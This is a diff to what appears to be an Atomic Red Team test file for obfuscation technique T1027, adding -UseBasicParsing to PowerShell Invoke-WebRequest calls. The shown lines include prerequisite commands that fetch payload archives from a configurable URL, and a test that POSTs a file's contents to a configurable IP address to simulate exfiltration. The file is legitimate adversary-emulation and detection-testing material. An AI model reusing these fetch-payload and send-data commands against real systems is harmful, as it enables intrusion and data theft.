@@ -109,7 +109,7 @@ atomic_tests:
     get_prereq_command: |
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip"
+      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -UseBasicParsing
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\" -Force
   executor:
     command: |
@@ -164,7 +164,7 @@ atomic_tests:
       default: 127.0.0.1
   executor:
     command: |
-      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}"
+      Invoke-WebRequest -Uri #{ip_address} -Method POST -Body "#{input_file}" -UseBasicParsing
     name: powershell
 - name: Obfuscated Command in PowerShell
   auto_generated_guid: 8b3f4ed6-077b-4bdd-891c-2d237f19410f
@@ -238,7 +238,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip"
+      Invoke-WebRequest "#{url_path}" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -UseBasicParsing
       Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\T1027js.zip" -DestinationPath "PathToAtomicsFolder\..\ExternalPayloads\temp_T1027js.zip\" -Force
   executor:
     command: |
